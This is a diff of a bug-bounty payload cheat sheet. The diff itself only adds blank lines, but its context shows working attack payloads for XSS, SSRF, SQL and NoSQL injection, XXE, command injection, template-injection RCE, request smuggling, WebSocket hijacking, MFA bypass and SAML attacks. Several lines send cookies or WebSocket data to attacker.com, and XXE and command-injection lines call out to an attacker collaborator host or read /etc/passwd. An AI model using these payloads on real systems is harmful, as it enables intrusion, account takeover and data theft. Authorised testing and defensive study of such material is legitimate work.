@@ -12,6 +12,7 @@ Payloads, bypass tables, wordlists, and submission rules.
 ## XSS PAYLOADS
 
 ### Basic Probes
+
 ```javascript
 <script>alert(document.domain)</script>
 <img src=x onerror=alert(document.domain)>
@@ -22,6 +23,7 @@ javascript:alert(document.domain)
 ```
 
 ### Cookie Theft (proof of impact)
+
 ```javascript
 <script>document.location='https://attacker.com/c?c='+document.cookie</script>
 <img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
@@ -29,6 +31,7 @@ javascript:alert(document.domain)
 ```
 
 ### CSP Bypass Techniques
+
 ```javascript
 // If unsafe-inline blocked — use fetch/XHR
 <img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">
@@ -50,6 +53,7 @@ javascript:alert(document.domain)
 ```
 
 ### DOM XSS Sources and Sinks
+
 ```javascript
 // Sources (user-controlled input)
 location.hash
@@ -77,6 +81,7 @@ location.href = SOURCE
 ## SSRF PAYLOADS
 
 ### Cloud Metadata
+
 ```bash
 # AWS
 http://169.254.169.254/latest/meta-data/
@@ -95,6 +100,7 @@ http://169.254.169.254/metadata/instance?api-version=2021-02-01
 ```
 
 ### Internal Service Fingerprinting
+
 ```bash
 http://localhost:6379      # Redis (unauthenticated, RESP protocol)
 http://localhost:9200      # Elasticsearch (/_cat/indices)
@@ -105,6 +111,7 @@ http://localhost:10.96.0.1:443  # Kubernetes API server
 ```
 
 ### SSRF IP Bypass Payloads
+
 ```bash
 # All of these map to 127.0.0.1:
 http://2130706433          # decimal
@@ -127,6 +134,7 @@ http://allowed-domain.com/redirect?to=http://169.254.169.254/
 ## SQL INJECTION PAYLOADS
 
 ### Detection
+
 ```sql
 '
 ''
@@ -143,6 +151,7 @@ http://allowed-domain.com/redirect?to=http://169.254.169.254/
 ```
 
 ### Union-Based (determine column count)
+
 ```sql
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
@@ -151,6 +160,7 @@ http://allowed-domain.com/redirect?to=http://169.254.169.254/
 ```
 
 ### Blind SQLi (time-based confirmation)
+
 ```sql
 # MySQL
 ' AND SLEEP(5)--
@@ -163,6 +173,7 @@ http://allowed-domain.com/redirect?to=http://169.254.169.254/
 ```
 
 ### WAF Bypass
+
 ```sql
 /*!50000 SELECT*/ * FROM users     -- MySQL inline comment
 SE/**/LECT * FROM users             -- comment injection
@@ -176,6 +187,7 @@ SeLeCt * FrOm uSeRs                -- case variation
 ## XXE PAYLOADS
 
 ### Classic File Read
+
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
@@ -183,6 +195,7 @@ SeLeCt * FrOm uSeRs                -- case variation
 ```
 
 ### Blind OOB via HTTP (DNS confirmation)
+
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
@@ -190,6 +203,7 @@ SeLeCt * FrOm uSeRs                -- case variation
 ```
 
 ### Blind OOB via DNS + Data Exfil
+
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
@@ -201,6 +215,7 @@ SeLeCt * FrOm uSeRs                -- case variation
 ```
 
 ### XXE via DOCX/SVG/PDF Upload
+
 - SVG: `<image href="file:///etc/passwd" />`
 - DOCX: malicious XML in `word/document.xml` with external entity
 
@@ -223,6 +238,7 @@ SeLeCt * FrOm uSeRs                -- case variation
 ## IDOR / AUTH BYPASS PAYLOADS
 
 ### Horizontal Privilege Escalation
+
 ```bash
 # Change numeric ID
 GET /api/user/123/profile → GET /api/user/124/profile
@@ -241,6 +257,7 @@ GET /api/orders → GET /api/orders?user_id=456
 ```
 
 ### Vertical Privilege Escalation
+
 ```bash
 # Parameter pollution
 POST /api/user/update
@@ -261,6 +278,7 @@ POST /api/user/update
 ## AUTHENTICATION BYPASS PAYLOADS
 
 ### JWT Attacks
+
 ```bash
 # None algorithm
 # Decode JWT, change alg to "none", remove signature
@@ -274,6 +292,7 @@ hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
 ```
 
 ### OAuth Attacks
+
 ```bash
 # Missing PKCE test
 GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
@@ -289,6 +308,7 @@ GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
 ## NOSQL INJECTION PAYLOADS (MongoDB)
 
 ### Operator Injection (JSON body)
+
 ```json
 {"username": {"$ne": null}, "password": {"$ne": null}}
 {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
@@ -298,6 +318,7 @@ GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
 ```
 
 ### GET Parameter Injection
+
 ```bash
 # URL parameter injection
 /login?username[$ne]=null&password[$ne]=null
@@ -312,6 +333,7 @@ GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
 ```
 
 ### Auth Bypass One-Liners
+
 ```bash
 curl -s -X POST https://target.com/api/login \
   -H "Content-Type: application/json" \
@@ -326,6 +348,7 @@ curl -s -X POST https://target.com/api/login \
 ## COMMAND INJECTION PAYLOADS
 
 ### Basic Detection
+
 ```bash
 ; id
 | id
@@ -340,6 +363,7 @@ $(sleep 5)
 ```
 
 ### Blind OOB (out-of-band confirmation)
+
 ```bash
 ; curl https://attacker.burpcollaborator.net
 ; nslookup attacker.burpcollaborator.net
@@ -349,6 +373,7 @@ $(nslookup attacker.burpcollaborator.net)
 ```
 
 ### Bypass Techniques
+
 ```bash
 # Bypass space filter
 ;{cat,/etc/passwd}
@@ -373,6 +398,7 @@ $(nslookup attacker.burpcollaborator.net)
 ```
 
 ### Context-Specific (filename injection)
+
 ```bash
 # File upload filenames
 test.jpg; id
@@ -387,6 +413,7 @@ test`id`.jpg
 ## SSTI DETECTION PAYLOADS (All Engines)
 
 ### Universal Probe (send all, observe which evaluate)
+
 ```
 {{7*7}}        → 49 = Jinja2 (Python) or Twig (PHP)
 ${7*7}         → 49 = Freemarker (Java) or Spring EL
@@ -400,6 +427,7 @@ ${"freemarker.template.utility.Execute"?new()("id")}  → Freemarker RCE
 ### RCE Payloads by Engine
 
 **Jinja2 (Python/Flask/Django):**
+
 ```python
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
@@ -407,18 +435,21 @@ ${"freemarker.template.utility.Execute"?new()("id")}  → Freemarker RCE
 ```
 
 **Twig (PHP/Symfony):**
+
 ```php
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 {{['id']|filter('system')}}
 ```
 
 **Freemarker (Java):**
+
 ```
 ${"freemarker.template.utility.Execute"?new()("id")}
 <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
 ```
 
 **ERB (Ruby on Rails):**
+
 ```ruby
 <%= `id` %>
 <%= system("id") %>
@@ -426,17 +457,20 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 ```
 
 **Spring Thymeleaf:**
+
 ```java
 ${T(java.lang.Runtime).getRuntime().exec('id')}
 __${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
 ```
 
 **EJS (Node.js):**
+
 ```javascript
 <%= process.mainModule.require('child_process').execSync('id') %>
 ```
 
 ### Where to Test
+
 ```
 Name/bio/username fields, email subject templates, invoice/PDF generators,
 URL path parameters reflected in page, error messages, search query reflections,
@@ -448,6 +482,7 @@ HTTP headers that appear in rendered responses, notification templates
 ## HTTP SMUGGLING PAYLOADS
 
 ### CL.TE — Content-Length front-end, Transfer-Encoding back-end
+
 ```http
 POST / HTTP/1.1
 Host: target.com
@@ -460,6 +495,7 @@ SMUGGLED
 ```
 
 ### TE.CL — Transfer-Encoding front-end, Content-Length back-end
+
 ```http
 POST / HTTP/1.1
 Host: target.com
@@ -474,6 +510,7 @@ SMUGGLED
 ```
 
 ### TE.TE — Both support Transfer-Encoding, obfuscate to disable one
+
 ```http
 # Obfuscate the TE header so one layer ignores it
 Transfer-Encoding: xchunked
@@ -489,6 +526,7 @@ Transfer-Encoding
 ```
 
 ### H2.CL — HTTP/2 front-end with Content-Length injection
+
 ```
 # In Burp Repeater, switch to HTTP/2
 # Add Content-Length header manually (not auto-set by HTTP/2)
@@ -497,6 +535,7 @@ Transfer-Encoding
 ```
 
 ### Detection (Burp)
+
 ```
 1. Install HTTP Request Smuggler extension
 2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
@@ -505,6 +544,7 @@ Transfer-Encoding
 ```
 
 ### Impact Chain
+
 ```
 Basic desync          → Capture victim's next request → Read their auth token
 + Admin user traffic  → Access admin as victim
@@ -516,6 +556,7 @@ Basic desync          → Capture victim's next request → Read their auth toke
 ## WEBSOCKET PAYLOADS
 
 ### IDOR / Auth Bypass
+
 ```javascript
 // Test: subscribe to other user's channel
 {"action": "subscribe", "channel": "user_VICTIM_ID_HERE"}
@@ -526,6 +567,7 @@ Basic desync          → Capture victim's next request → Read their auth toke
 ```
 
 ### Cross-Site WebSocket Hijacking (CSWSH)
+
 ```html
 <!-- Host on attacker site. If no Origin validation, steals victim's WS data. -->
 <script>
@@ -537,6 +579,7 @@ ws.onmessage = (e) => fetch('https://attacker.com/?d='+encodeURIComponent(e.data
 ```
 
 ### Test Origin Validation
+
 ```bash
 # Should reject non-target origins. If it doesn't = CSWSH vulnerability
 wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
@@ -545,6 +588,7 @@ wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
 ```
 
 ### Injection via WS Messages
+
 ```javascript
 // XSS in chat/notification system
 {"message": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"}
@@ -561,6 +605,7 @@ wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
 ## MFA / 2FA BYPASS PAYLOADS
 
 ### Pattern 1: OTP Brute Force (no rate limit)
+
 ```bash
 # Try all 6-digit OTPs
 ffuf -u "https://target.com/api/verify-otp" \
@@ -577,6 +622,7 @@ ffuf -u "https://target.com/api/verify-otp" \
 ```
 
 ### Pattern 2: OTP Reuse (token not invalidated)
+
 ```
 1. Request OTP → receive "123456"
 2. Submit OTP correctly → authenticated
@@ -587,6 +633,7 @@ ffuf -u "https://target.com/api/verify-otp" \
 ```
 
 ### Pattern 3: Response Manipulation
+
 ```
 Step 1: Enter wrong OTP → intercept response in Burp
 Step 2: Change: {"success": false, "message": "Invalid OTP"} → {"success": true}
@@ -595,6 +642,7 @@ Also try: change status code 401 → 200, or change redirect from /failed to /da
 ```
 
 ### Pattern 4: Code Predictability
+
 ```python
 import requests, time
 
@@ -608,12 +656,14 @@ for t_offset in range(-30, 31):  # Test ±30 seconds
 ```
 
 ### Pattern 5: Backup Codes Not Rate Limited
+
 ```bash
 # Backup codes are typically 8-character alphanumeric = smaller space than 6-digit TOTP
 # Try brute force on /api/verify-backup-code if no rate limit
 ```
 
 ### Pattern 6: Skip MFA Step (Workflow Bypass)
+
 ```bash
 # After entering username/password, you get a session cookie
 # Test: skip the /mfa/verify step entirely, go directly to /dashboard
@@ -624,6 +674,7 @@ for t_offset in range(-30, 31):  # Test ±30 seconds
 ```
 
 ### Pattern 7: Race on MFA Verification
+
 ```python
 import asyncio, aiohttp
 
@@ -647,6 +698,7 @@ asyncio.run(race())
 ## SAML ATTACKS
 
 ### Attack 1: XML Signature Wrapping (XSW)
+
 ```xml
 <!-- Original valid assertion: -->
 <saml:Assertion ID="legit">
@@ -668,6 +720,7 @@ asyncio.run(race())
 ```
 
 ### Attack 2: Comment Injection in NameID
+
 ```xml
 <!-- Original: user@company.com -->
 <!-- Injected:  -->
@@ -678,6 +731,7 @@ asyncio.run(race())
 ```
 
 ### Attack 3: Signature Stripping
+
 ```
 1. Capture SAMLResponse (base64 decode from browser)
 2. Remove or modify the <Signature> element entirely
@@ -687,6 +741,7 @@ asyncio.run(race())
 ```
 
 ### Attack 4: XXE in SAML Assertion
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
@@ -698,6 +753,7 @@ asyncio.run(race())
 ```
 
 ### Tools
+
 ```bash
 # SAMLRaider (Burp extension) — most automated XSW testing
 # Install from BApp Store, intercept SAMLResponse, right-click → SAML Raider
